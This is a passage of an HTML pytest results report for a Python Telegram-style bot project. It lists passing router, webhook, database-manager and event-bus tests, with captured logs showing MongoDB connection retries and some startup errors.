            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34b288ed7674ef4ee928, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34b888ed7674ef4ee929, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34bf88ed7674ef4ee92a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-80&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-81&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34c988ed7674ef4ee92b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf34d688ed7674ef4ee92c, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_config_manager_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_router_command_registration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_command_handler_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_process_update_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_webhook_mode_setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_integration.py::TestIntegration::test_polling_mode_setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_mongo_schemas.py::test_user_model</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_mongo_schemas.py::test_narrative_fragment_model</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_mongo_schemas.py::test_item_model</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_mongodb_handler.py::test_mongodb_handler_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_mongodb_handler.py::test_collection_access_methods</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_register_command_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_register_command_handler_invalid_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_register_message_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_register_message_handler_invalid_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_set_default_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_set_default_handler_invalid_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_route_update_command</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_route_update_command_no_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.core.router:router.py:152 No handler found for update<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_route_update_message</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_route_update_default_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_route_update_no_handlers</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.core.router:router.py:152 No handler found for update<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_extract_command</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router.py::TestRouter::test_matches_filter</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router_database_context.py::TestRouterDatabaseContext::test_router_initialization_without_database_context</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router_database_context.py::TestRouterDatabaseContext::test_router_passes_context_to_handler_with_router_parameter</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router_database_context.py::TestRouterDatabaseContext::test_router_calls_handler_without_router_parameter</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_router_database_context.py::TestRouterDatabaseContext::test_router_calls_default_handler_with_context</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_handler.py::test_sqlite_handler_initialization</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_handler.py::test_table_access_methods</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_handler.py::test_initialize_tables</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_handler.py::test_execute_query</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_handler.py::test_execute_update</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_get_user_profiles_schema</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_get_subscriptions_schema</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_get_user_profiles_indexes</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_get_subscriptions_indexes</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_initialize_database</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_sqlite_schemas.py::test_constants</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_user_endpoints.py::TestUserAPIEndpoints::test_router_prefix_and_tags</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_handle</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_setup_webhook_valid_url</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_setup_webhook_invalid_url</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.handlers.webhook:webhook.py:75 Invalid webhook URL: Must use HTTPS protocol<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_setup_webhook_with_certificate</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_validate_request_valid</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_validate_request_missing_headers</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:100 Invalid request: Missing headers<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_validate_request_invalid_method</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:105 Invalid request method: GET<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_validate_request_valid_method</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_process_update</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_webhook.py::TestWebhookHandler::test_process_update_logging</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>INFO     src.handlers.webhook:webhook.py:125 Processing webhook update
INFO     src.handlers.webhook:webhook.py:142 Webhook update processed successfully<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_is_connected_property</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_all_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_mongodb_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_mongodb_retry_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: Timeout<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_mongodb_retry_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: Timeout
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: Timeout
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: Timeout
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: Timeout
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: Timeout
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_sqlite_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_connect_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.manager:manager.py:176 Error connecting to SQLite database: Connection failed<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_get_mongo_db_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_get_sqlite_conn_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_get_sqlite_conn_not_connected</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_health_check_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_health_check_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:226 MongoDB health check failed: MongoDB error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_health_check_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.manager:manager.py:234 SQLite health check failed: SQLite error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_close_all_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_close_all_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.manager:manager.py:249 Error closing MongoDB connection: MongoDB error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManager::test_close_all_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.manager:manager.py:257 Error closing SQLite connection: SQLite error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::TestDatabaseManagerIntegration::test_database_manager_properties</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/database/test_manager.py::test_database_manager_with_real_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_connect_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/events/test_bus.py::TestEventBus::test_connect_failure</td>
          <td class="col-duration">3.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
